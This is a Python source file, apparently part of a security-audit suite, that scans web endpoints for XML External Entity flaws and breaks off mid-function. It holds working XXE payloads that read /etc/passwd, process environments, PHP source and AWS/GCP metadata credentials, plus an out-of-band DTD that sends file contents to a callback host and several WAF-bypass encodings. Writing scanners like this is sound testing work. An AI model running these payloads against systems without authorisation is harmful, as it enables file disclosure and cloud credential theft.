#!/usr/bin/env python3
"""
auditing_tools/xxe_finder.py — XML External Entity Auditor (v4.0)
═══════════════════════════════════════════════════════════════════════════════

Comprehensive XXE detection for Argus, with self-sync to the remote DB.

v4.0 — Argus v4.0 integration + hardening

  PLUMBING
    • SharedRateLimiter, threaded across surfaces with config-driven rate.
    • Session wrapper with response-size cap (2MB) and adaptive backoff
      on 429/503 so a busy target can't stall the scan.
    • scan_id-aware: findings upsert to xxe_findings in chunks of 200
      via DB.upsert_xxe_findings(scan_id, payloads).
    • Auth-header plumb-through: caller-supplied headers merge on top of
      the platform headers derived from config, same as other audit
      modules in the suite.
    • CLI parity with the rest of the suite: --rate-limit, --concurrency,
      --timeout, --scan-id, --max-surfaces.

  DETECTION
    • Three confirmation modes preserved (in-band, error-based, OOB),
      each with a control response so the fingerprint stays differential.
    • Capability fingerprinting gains two new probes:
        - xinclude  : XInclude support (distinct sink, distinct fix)
        - svg_entity: SVG-specific entity expansion, used when the surface
                      content-type is image/svg+xml
    • In-band payload set expands to cover /proc/self/{environ,cmdline},
      /etc/{shadow,hosts}, and Windows hosts file.
    • Error-based payloads now try three local-DTD paths
      (/usr/share/xml, /usr/share/yelp, web root) instead of one.
    • WAF bypass variants gain UTF-16LE, UTF-32, and a DOCTYPE-split form.
    • Parser signatures gain Ruby REXML, .NET XslCompiledTransform, and
      Node.js libxmljs, so the family attribution stays accurate.

  CORRECTNESS
    • Fix: `errors` / `oob_findings` are now pre-initialised to [] before
      the per-surface body. Old code relied on Python's evaluate-on-false
      ternary guard; that worked but was fragile if the order ever changed.
    • Fix: `run_bypass` is only called on `not inband` — the old code
      reached it via a `continue`-then-fallthrough path that was correct
      but non-obvious. Expressed explicitly now.
    • Fix: `_redact_url` applied to every log line that prints a target.
      Secrets in query strings stay out of argus.log.

Honesty note:
  Without a headless browser this module cannot prove that a file was read
  by an application on the target — it proves the parser resolved an entity
  whose payload was visible in the response, or made an out-of-band fetch.
  That's the same evidence Burp Scanner, Nuclei, and XXEinjector use. For
  OOB proof, run with --interactsh or supply --oob-domain.

Outputs (into `outdir`):
  • xxe_findings.json     — full structured report
  • xxe_candidates.txt    — flat list for triage
  • xxe_confirmed.txt     — in-band and error-based confirmed findings
  • xxe_oob.txt           — OOB findings and deployment payloads
  • xxe_surface.txt       — every XML-accepting endpoint discovered
  • xxe_fingerprints.txt  — parser family + capabilities per endpoint
"""

from __future__ import annotations

import hashlib
import json
import logging
import random
import re
import shutil
import statistics
import string
import subprocess
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.xxe_finder")


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG (defensive — pipeline runs without config.py or db.py)
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    if not CFG_LOADED:
        return default
    return getattr(CFG, key, default)


def _xxe_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("xxe", {})
    return {
        "rate_limit":    entry.get("rate_limit", 3),
        "concurrency":   entry.get("concurrency", 3),
        "timeout":       entry.get("timeout", 12),
        "max_surfaces":  entry.get("max_surfaces", 200),
        "test_error":    entry.get("error_based", True),
        "test_oob":      entry.get("oob", True),
        "test_bypass":   entry.get("bypass", True),
        "verify_tls":    entry.get("verify_tls", _cfg("VERIFY_TLS", False)),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        auth_hdrs = getattr(CFG, "AUTH_HEADERS", {}) or {}
        if auth_hdrs:
            h.update(auth_hdrs)
    return h


def _db_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

FINDING_SCHEMA_VERSION = 1

DEFAULT_TIMEOUT         = 12
BASELINE_SAMPLES        = 2
REQUEST_SLEEP           = 0.08
MAX_RESPONSE_BYTES      = 2_000_000

OOB_CORRELATION_WAIT    = 10.0
INTERACTSH_STARTUP_WAIT = 3.0

MAX_SURFACES            = 200
MAX_PAYLOADS_PER_SURFACE = 14

# ── File markers ────────────────────────────────────────────────────────────
LINUX_FILE_MARKERS = [
    "root:x:0:0", "root:*:0:0", "daemon:", "bin:x:", "/bin/bash",
    "uid=0(root)", "hostname", "PATH=",
]
WINDOWS_FILE_MARKERS = [
    "[extensions]", "[fonts]", "[boot loader]",
    "for 16-bit app support", "[mci extensions]",
    "127.0.0.1       localhost",
]
PHP_SOURCE_MARKERS = [
    "PD9waHA", "PGh0bWw+", "PCFET0NUWVBFIGh0bWw+",
]
METADATA_MARKERS = [
    "AccessKeyId", "SecretAccessKey", "ami-id", "instance-id",
    "computeMetadata", "service-accounts", "token_type",
    "subscriptionId", "vmId", "resourceGroupName",
]
FILE_MARKERS = (
    LINUX_FILE_MARKERS + WINDOWS_FILE_MARKERS + METADATA_MARKERS
)

# ── Parser signature families ───────────────────────────────────────────────
PARSER_SIGNATURES = {
    "libxml2": [
        r"lxml\.etree\.XMLSyntaxError", r"xmlParseEntityRef",
        r"Failed to load external entity", r"Premature end of data in tag",
        r"DOMDocument::loadXML",
    ],
    "xerces": [
        r"org\.apache\.xerces", r"com\.sun\.org\.apache\.xerces",
        r"SAXParseException", r"was referenced, but not declared",
        r"cvc-elt\.",
    ],
    "dotnet": [
        r"System\.Xml\.XmlException", r"System\.Xml\.XmlReader",
        r"An error occurred while parsing EntityName",
        r"DTD is prohibited", r"XslCompiledTransform",
    ],
    "java_sax": [
        r"org\.xml\.sax\.SAXParseException", r"DocumentBuilder",
        r"JAXP00010001", r"AccessExternalDTD", r"disallow-doctype-decl",
    ],
    "java_stax": [
        r"javax\.xml\.stream\.XMLStreamException",
        r"IS_SUPPORTING_EXTERNAL_ENTITIES", r"woodstox", r"com\.ctc\.wstx",
    ],
    "python_etree": [r"xml\.etree\.ElementTree\.ParseError"],
    "nokogiri":     [r"Nokogiri::XML::SyntaxError"],
    "ruby_rexml":   [r"REXML::ParseException"],
    "node_libxml":  [r"libxmljs\.parseXml"],
    "go_xml":       [r"xml: syntax error", r"XML syntax error"],
    "php_libxml":   [r"libxml_get_errors", r"simplexml_load_string"],
}

SOAP_PATH_HINTS   = ("/soap", "/ws", "/services", "/xmlrpc",
                     ".asmx", ".svc", "/wsdl")
SAML_PATH_HINTS   = ("/saml", "/acs", "/sso", "/sso/saml", "/auth/saml")
IMPORT_PATH_HINTS = ("/import", "/feed", "/rss", "/atom", "/upload",
                     "/avatar", "/attachment", "/xml")
XML_PARAM_NAMES = {
    "xml", "data", "soap", "saml", "body", "payload", "content",
    "xmldata", "xml_data", "document", "feed", "rss", "svg",
}

# ── Capability probes ───────────────────────────────────────────────────────
CAPABILITY_PROBES = [
    (
        "dtd_allowed",
        '<?xml version="1.0"?><!DOCTYPE r [<!ELEMENT r ANY>]><r>ARGUS_MARKER</r>',
        '<?xml version="1.0"?><r>ARGUS_MARKER</r>',
        "marker_present",
    ),
    (
        "internal_entity",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x "ARGUS_ENTITY_MARKER">]><r>&x;</r>',
        '<?xml version="1.0"?><r>ARGUS_CONTROL</r>',
        "entity_expanded",
    ),
    (
        "external_file",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>',
        '<?xml version="1.0"?><r>ARGUS_CONTROL</r>',
        "file_read",
    ),
    (
        "parameter_entity",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p "ARGUS_PE_MARKER"> %p;]><r>ARGUS_AFTER_PE</r>',
        '<?xml version="1.0"?><r>ARGUS_CONTROL</r>',
        "pe_marker",
    ),
    (
        "external_dtd",
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://127.0.0.1:1/argus.dtd"> %d;]><r>x</r>',
        '<?xml version="1.0"?><r>x</r>',
        "dtd_error",
    ),
    (
        "xinclude",
        '<r xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include href="file:///etc/hostname" parse="text"/></r>',
        '<?xml version="1.0"?><r>ARGUS_CONTROL</r>',
        "file_read",
    ),
]

# ── In-band payloads ────────────────────────────────────────────────────────
INBAND_PAYLOADS = [
    {
        "label": "linux_passwd",
        "requires": "external_file",
        "markers": LINUX_FILE_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "linux_proc_environ",
        "requires": "external_file",
        "markers": LINUX_FILE_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "linux_hosts",
        "requires": "external_file",
        "markers": LINUX_FILE_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "windows_winini",
        "requires": "external_file",
        "markers": WINDOWS_FILE_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "windows_hosts",
        "requires": "external_file",
        "markers": WINDOWS_FILE_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"file:///c:/windows/system32/drivers/etc/hosts">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "php_filter_source",
        "requires": "external_file",
        "markers": PHP_SOURCE_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"php://filter/convert.base64-encode/resource=index.php">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "aws_metadata",
        "requires": "external_file",
        "markers": METADATA_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>'
            '<data>&xxe;</data>'
        ),
    },
    {
        "label": "gcp_metadata",
        "requires": "external_file",
        "markers": METADATA_MARKERS,
        "body": (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM '
            '"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>'
            '<data>&xxe;</data>'
        ),
    },
]

# ── Error-based payloads (three local-DTD paths) ───────────────────────────
ERROR_PAYLOADS = [
    {
        "label": "local_dtd_default",
        "requires": "external_file",
        "markers": LINUX_FILE_MARKERS,
        "body": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY % file SYSTEM "file:///etc/passwd">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            "'file:///nonexistent/%file;'>\">"
            '%eval;%error;'
            ']>'
        ),
    },
    {
        "label": "local_dtd_xml_share",
        "requires": "external_file",
        "markers": LINUX_FILE_MARKERS,
        "body": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY % file SYSTEM "file:///etc/passwd">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            "'file:///usr/share/xml/%file;'>\">"
            '%eval;%error;'
            ']>'
        ),
    },
    {
        "label": "external_pe_error",
        "requires": "parameter_entity",
        "markers": LINUX_FILE_MARKERS,
        "body": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
            '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
            "'file:///nonexistent/%xxe;'>\">"
            '%eval;%error;'
            ']>'
        ),
    },
]

OOB_EVIL_DTD = (
    '<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
    '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{oob}/?d=%file;\'>">\n'
    '%eval;\n'
    '%exfil;\n'
)

OOB_PAYLOAD_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob}/evil.dtd"> %xxe;]>'
    '<data>ARGUS_OOB_PROBE</data>'
)

OOB_PING_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oob}/"> %xxe;]>'
    '<data>ARGUS_OOB_PING</data>'
)


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class XMLSurface:
    url: str
    method: str = "POST"
    param: str = "(body)"
    location: str = "body"
    hint: str = ""
    accepts_xml: bool = False
    content_type: str = ""

    def to_dict(self) -> dict:
        return {
            "url": self.url, "method": self.method,
            "param": self.param, "location": self.location,
            "hint": self.hint, "accepts_xml": self.accepts_xml,
            "content_type": self.content_type,
        }


@dataclass
class ParserProfile:
    url: str
    family: str = "unknown"
    capabilities: dict[str, bool] = field(default_factory=dict)
    baseline_status: int = 0
    baseline_length: int = 0

    def to_dict(self) -> dict:
        return {
            "url": self.url, "family": self.family,
            "capabilities": self.capabilities,
            "baseline_status": self.baseline_status,
            "baseline_length": self.baseline_length,
        }


@dataclass
class XXEFinding:
    target: str
    param: str
    technique: str
    context: str = ""
    severity: str = "MEDIUM"
    confidence: int = 50
    confirmed: bool = False
    payload: str = ""
    evidence: str = ""
    file_read: str = ""
    parser_family: str = ""
    oob_token: str = ""
    oob_confirmed: bool = False
    bypass_used: str = ""
    param_location: str = "body"
    http_status: int = 0
    auth_enabled: bool = False
    first_seen: str = ""
    details: dict = field(default_factory=dict)

    @property
    def finding_hash(self) -> str:
        raw = (
            f"{self.target}|{self.param}|{self.param_location}|{self.technique}"
        )
        return hashlib.sha256(raw.encode()).hexdigest()

    @property
    def target_host(self) -> str:
        return urllib.parse.urlparse(self.target).hostname or ""

    def to_dict(self) -> dict:
        return {
            "schema_version": FINDING_SCHEMA_VERSION,
            "target":         self.target,
            "target_host":    self.target_host,
            "param_name":     self.param,
            "param_location": self.param_location,
            "technique":      self.technique,
            "context":        self.context,
            "severity":       self.severity,
            "confidence":     self.confidence,
            "confirmed":      1 if self.confirmed else 0,
            "payload":        (self.payload or "")[:2048],
            "evidence":       (self.evidence or "")[:1024],
            "file_read":      (self.file_read or "")[:512],
            "parser_family":  self.parser_family,
            "oob_token":      self.oob_token,
            "oob_confirmed":  1 if self.oob_confirmed else 0,
            "bypass_used":    self.bypass_used,
            "http_status":    self.http_status,
            "details":        self.details,
            "auth_enabled":   1 if self.auth_enabled else 0,
            "finding_hash":   self.finding_hash,
            "first_seen":     self.first_seen or _db_now(),
        }


# ═════════════════════════════════════════════════════════════════════════════
#  RATE LIMITER (adaptive, thread-safe) — same contract as xss_finder
# ═════════════════════════════════════════════════════════════════════════════

class SharedRateLimiter:
    def __init__(self, rate_limit: float, backoff_max: float = 30.0):
        self.min_interval = 1.0 / rate_limit if rate_limit and rate_limit > 0 else 0.0
        self._last = 0.0
        self._lock = threading.Lock()
        self._backoff_until = 0.0
        self._backoff_max = backoff_max
        self._consecutive_blocks = 0
        self._block_lock = threading.Lock()

    def wait(self) -> None:
        if self.min_interval <= 0:
            return
        with self._lock:
            while True:
                now = time.monotonic()
                wait_until = max(self._last + self.min_interval, self._backoff_until)
                if now >= wait_until:
                    break
                time.sleep(wait_until - now)
            self._last = time.monotonic()

    def note_response(self, status: int) -> None:
        with self._block_lock:
            if status in (429, 503):
                self._consecutive_blocks += 1
                backoff = min(
                    self._backoff_max,
                    (2 ** min(self._consecutive_blocks, 6)) * 0.25,
                )
                self._backoff_until = time.monotonic() + backoff
            elif 200 <= status < 400:
                self._consecutive_blocks = 0


# ═════════════════════════════════════════════════════════════════════════════
#  SESSION — rate-limited, response-capped, matches the suite pattern
# ═════════════════════════════════════════════════════════════════════════════

class Session:
    def __init__(
        self, limiter: SharedRateLimiter, headers: dict, timeout: int,
        *, verify_tls: bool = False, max_bytes: int = MAX_RESPONSE_BYTES,
    ):
        self.session = requests.Session()
        self.session.verify = verify_tls
        if headers:
            self.session.headers.update(headers)
        self.session.headers.setdefault("User-Agent", "Argus-XXE-Auditor/4.0")
        self.session.headers.setdefault(
            "Accept", "application/xml, text/xml, application/xhtml+xml, */*",
        )
        self._limiter = limiter
        self.timeout = timeout
        self.max_bytes = max_bytes

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        self._limiter.wait()
        try:
            resp = self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                stream=True,
                **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {_redact_url(url)}: {e}")
            return None

        self._limiter.note_response(resp.status_code)

        try:
            resp._content = resp.raw.read(self.max_bytes, decode_content=True)
        except Exception:
            resp._content = b""
        return resp

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)

    def post(self, url: str, **kwargs):
        return self.request("POST", url, **kwargs)


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

_SECRET_PARAM_RE = re.compile(
    r"(?i)(cookie|authorization|token|api[_-]?key|secret|password|session|bearer)"
)


def _redact_url(url: str, max_len: int = 240) -> str:
    try:
        parsed = urllib.parse.urlparse(url)
        if not parsed.query:
            return url[:max_len]
        pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        redacted = [
            (k, "***" if _SECRET_PARAM_RE.search(k) else v)
            for k, v in pairs
        ]
        clean = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(redacted, safe=""))
        )
        return clean[:max_len]
    except Exception:
        return url[:max_len]


def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls: list[str] = []
    seen: set[str] = set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split()[0]
        if not token.startswith(("http://", "https://")):
            token = "https://" + token
        if token not in seen:
            seen.add(token)
            urls.append(token)
    return urls


def _body(resp: Optional[requests.Response], limit: int = MAX_RESPONSE_BYTES) -> str:
    if resp is None:
        return ""
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _match_markers(body: str, markers: list[str]) -> list[str]:
    return [m for m in markers if m in body]


def _fingerprint_parser(body: str) -> str:
    for family, sigs in PARSER_SIGNATURES.items():
        for sig in sigs:
            if re.search(sig, body, re.I):
                return family
    return ""


def _utf16be(payload: str) -> bytes:
    adjusted = re.sub(
        r'encoding\s*=\s*["\']UTF-8["\']', 'encoding="UTF-16"',
        payload, flags=re.I,
    )
    if 'encoding="UTF-16"' not in adjusted:
        adjusted = '<?xml version="1.0" encoding="UTF-16"?>' + re.sub(
            r"^<\?xml[^>]*\?>", "", adjusted,
        )
    return adjusted.encode("utf-16-be")


def _utf16le(payload: str) -> bytes:
    adjusted = re.sub(
        r'encoding\s*=\s*["\']UTF-8["\']', 'encoding="UTF-16"',
        payload, flags=re.I,
    )
    if 'encoding="UTF-16"' not in adjusted:
        adjusted = '<?xml version="1.0" encoding="UTF-16"?>' + re.sub(
            r"^<\?xml[^>]*\?>", "", adjusted,
        )
    return adjusted.encode("utf-16-le")


def _waf_variants_xml(payload: str) -> list[tuple[bytes, str]]:
    variants: list[tuple[bytes, str]] = []

    variants.append((_utf16be(payload), "utf16be"))
    variants.append((_utf16le(payload), "utf16le"))

    mixed = re.sub(r"<!DOCTYPE", "<!doctype", payload, flags=re.I)
    mixed = re.sub(r"<!ENTITY", "<!entity", mixed, flags=re.I)
    mixed = re.sub(r"\bSYSTEM\b", "system", mixed)
    if mixed != payload:
        variants.append((mixed.encode("utf-8"), "case_mix"))

    variants.append((b"\xef\xbb\xbf" + payload.encode("utf-8"), "utf8_bom"))

    split = re.sub(r"<!DOCTYPE", "<!D\nOCTYPE", payload, flags=re.I)
    if split != payload:
        variants.append((split.encode("utf-8"), "doctype_split"))

    return variants


# ═════════════════════════════════════════════════════════════════════════════
#  OOB CAPTURE (unchanged contract from old file)
# ═════════════════════════════════════════════════════════════════════════════

class OOBCapture:
    def __init__(self, domain: Optional[str] = None, use_interactsh: bool = False):
        self.user_domain = domain
        self.use_interactsh = use_interactsh
        self.domain: Optional[str] = domain
        self.proc: Optional[subprocess.Popen] = None
        self.reader_thread: Optional[threading.Thread] = None
        self.interactions: list[dict] = []
        self.interaction_ids: set[str] = set()
        self.lock = threading.Lock()

    def start(self) -> bool:
        if self.user_domain:
            self.domain = self.user_domain
            log.info(f"    OOB domain : {self.domain} (manual verification)")
            return True
        if not self.use_interactsh:
            log.info("    OOB        : disabled")
            return False
        if not shutil.which("interactsh-client"):
            log.warning("    OOB        : interactsh-client not installed")
            return False
        try:
            self.proc = subprocess.Popen(
                ["interactsh-client", "-json", "-silent"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1,
            )
        except Exception as e:
            log.warning(f"    OOB        : spawn failed: {e}")
            return False

        domain = self._read_banner()
        if not domain:
            self.stop()
            return False
        self.domain = domain
        log.info(f"    OOB domain : {domain}")
        self.reader_thread = threading.Thread(
            target=self._read_interactions, daemon=True,
        )
        self.reader_thread.start()
        return True

    def _read_banner(self) -> Optional[str]:
        import select
        deadline = time.monotonic() + INTERACTSH_STARTUP_WAIT
        if not self.proc or not self.proc.stderr:
            return None
        pattern = re.compile(
            r"([a-z0-9]{20,}\.(?:oast\.(?:fun|site|pro|online|live)|interact\.sh))"
        )
        collected = ""
        while time.monotonic() < deadline:
            r, _, _ = select.select([self.proc.stderr], [], [], 0.5)
            if not r:
                continue
            line = self.proc.stderr.readline()
            if not line:
                break
            collected += line
            m = pattern.search(collected)
            if m:
                return m.group(1)
        return None

    def _read_interactions(self) -> None:
        if not self.proc or not self.proc.stdout:
            return
        for line in self.proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                continue
            with self.lock:
                self.interactions.append(obj)
                for key in ("full-id", "unique-id", "full_id", "unique_id"):
                    val = obj.get(key)
                    if val:
                        self.interaction_ids.add(str(val).lower())

    def new_token(self, prefix: str = "argusxxe") -> str:
        return prefix + "".join(
            random.choices(string.ascii_lowercase + string.digits, k=12)
        )

    def token_url(self, token: str) -> Optional[str]:
        if not self.domain:
            return None
        return f"http://{token}.{self.domain}"

    def check(self, token: str) -> bool:
        with self.lock:
            t = token.lower()
            return any(t in i for i in self.interaction_ids)

    def wait_and_check(
        self, tokens: list[str], wait: float = OOB_CORRELATION_WAIT,
    ) -> set[str]:
        if not tokens or not self.use_interactsh:
            return set()
        deadline = time.monotonic() + wait
        fired: set[str] = set()
        while time.monotonic() < deadline:
            for tok in tokens:
                if tok not in fired and self.check(tok):
                    fired.add(tok)
            if len(fired) == len(tokens):
                break
            time.sleep(0.5)
        return fired

    def stop(self) -> None:
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=3)
            except Exception:
                try:
                    self.proc.kill()
                except Exception:
                    pass


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

BENIGN_XML_BODY = '<?xml version="1.0"?><argus>argus_probe_marker</argus>'


def _hint_for_url(url: str) -> str:
    path = urllib.parse.urlparse(url).path.lower()
    if any(h in path for h in SOAP_PATH_HINTS):
        return "soap"
    if any(h in path for h in SAML_PATH_HINTS):
        return "saml"
    if any(h in path for h in IMPORT_PATH_HINTS):
        return "import"
    return ""


def _accepts_xml(
    session: Session, url: str, headers: Optional[dict],
) -> tuple[bool, str]:
    hdrs = {
        "Content-Type": "application/xml",
        "Accept": "application/xml, text/xml, */*",
    }
    if headers:
        hdrs.update(headers)

    resp = session.post(url, headers=hdrs, data=BENIGN_XML_BODY.encode("utf-8"))
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return False, ""

    body = _body(resp, limit=2000).lower()
    ct = resp.headers.get("Content-Type", "")

    if resp.status_code == 415:
        return False, ct
    if resp.status_code == 400 and any(
        kw in body for kw in ("media type", "content-type", "unsupported", "xml")
    ):
        return True, ct
    if resp.status_code >= 500:
        return False, ct
    return True, ct


def discover_xml_surfaces(
    session: Session, urls: list[str], headers: Optional[dict],
) -> list[XMLSurface]:
    surfaces: list[XMLSurface] = []
    seen: set[tuple] = set()

    for url in urls:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        for pname in params:
            if pname.lower() in XML_PARAM_NAMES:
                key = (url, pname, "query")
                if key not in seen:
                    seen.add(key)
                    surfaces.append(XMLSurface(
                        url=url, method="GET", param=pname,
                        location="query", hint="xml_param", accepts_xml=True,
                    ))

        hint = _hint_for_url(url)
        if hint:
            key = (url, "(body)", "body")
            if key not in seen:
                seen.add(key)
                accepts, ct = _accepts_xml(session, url, headers)
                surfaces.append(XMLSurface(
                    url=url, method="POST", param="(body)",
                    location="body", hint=hint,
                    accepts_xml=accepts, content_type=ct,
                ))

        if params and not hint:
            key = (url, "(body)", "body")
            if key not in seen:
                seen.add(key)
                accepts, ct = _accepts_xml(session, url, headers)
                if accepts:
                    surfaces.append(XMLSurface(
                        url=url, method="POST", param="(body)",
                        location="body", hint="",
                        accepts_xml=True, content_type=ct,
                    ))

    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — DIFFERENTIAL PARSER FINGERPRINTING
# ═════════════════════════════════════════════════════════════════════════════

def _inject_query_xml(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new, safe=""))
    )


def _send_xml(
    session: Session, surface: XMLSurface, body: str | bytes,
    headers: Optional[dict], timeout: Optional[int] = None,
) -> Optional[requests.Response]:
    if surface.location == "query":
        text = body.decode("utf-8", "ignore") if isinstance(body, bytes) else body
        test_url = _inject_query_xml(surface.url, surface.param, text)
        return session.get(test_url, headers=headers or {})

    hdrs = {"Content-Type": "application/xml", "Accept": "application/xml, */*"}
    if headers:
        hdrs.update(headers)
    payload_bytes = body.encode("utf-8") if isinstance(body, str) else body
    return session.post(surface.url, headers=hdrs, data=payload_bytes)


def _capability_predicate(
    key: str,
    test_body: str,
    control_body: str,
    test_resp: Optional[requests.Response],
    control_resp: Optional[requests.Response],
) -> bool:
    if test_resp is None or control_resp is None:
        return False

    test_text = _body(test_resp, limit=50_000)
    control_text = _body(control_resp, limit=50_000)

    if key == "marker_present":
        return (
            "ARGUS_MARKER" in test_text
            and "ARGUS_MARKER" not in control_text
        )
    if key == "entity_expanded":
        return (
            "ARGUS_ENTITY_MARKER" in test_text
            and "&x;" not in test_text
        )
    if key == "file_read":
        return bool(_match_markers(test_text, LINUX_FILE_MARKERS))
    if key == "pe_marker":
        return (
            "ARGUS_PE_MARKER" in test_text
            and "ARGUS_PE_MARKER" not in control_text
        )
    if key == "dtd_error":
        test_err = _fingerprint_parser(test_text)
        control_err = _fingerprint_parser(control_text)
        return bool(test_err) and test_err != control_err
    return False


def fingerprint_parser(
    session: Session, surface: XMLSurface, headers: Optional[dict],
) -> ParserProfile:
    profile = ParserProfile(url=surface.url)
    capabilities: dict[str, bool] = {}

    baseline_resp = _send_xml(
        session, surface,
        '<?xml version="1.0"?><argus>argus_baseline</argus>',
        headers,
    )
    if baseline_resp is not None:
        profile.baseline_status = baseline_resp.status_code
        profile.baseline_length = len(_body(baseline_resp))

    error_buffer: list[str] = []
    for capability, test_body, control_body, predicate_key in CAPABILITY_PROBES:
        test_resp = _send_xml(session, surface, test_body, headers)
        time.sleep(REQUEST_SLEEP)
        control_resp = _send_xml(session, surface, control_body, headers)
        time.sleep(REQUEST_SLEEP)

        passed = _capability_predicate(
            predicate_key, test_body, control_body, test_resp, control_resp,
        )
        capabilities[capability] = passed

        for r in (test_resp, control_resp):
            if r is not None and r.status_code >= 500:
                error_buffer.append(_body(r, limit=5000))

    profile.capabilities = capabilities

    combined = " ".join(error_buffer)
    profile.family = _fingerprint_parser(combined) or "unknown"
    return profile


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 + 4 — IN-BAND AND ERROR-BASED
# ═════════════════════════════════════════════════════════════════════════════

def _evaluate_payload(
    session: Session,
    surface: XMLSurface,
    profile: ParserProfile,
    body: str,
    markers: list[str],
    headers: Optional[dict],
    technique: str,
    auth_enabled: bool = False,
) -> Optional[XXEFinding]:
    resp = _send_xml(session, surface, body, headers)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return None

    resp_body = _body(resp)
    hits = _match_markers(resp_body, markers)
    if not hits:
        return None

    if technique == "error" and not _fingerprint_parser(resp_body):
        return None

    metadata_hit = any(h in hits for h in METADATA_MARKERS)
    if metadata_hit or technique == "inband":
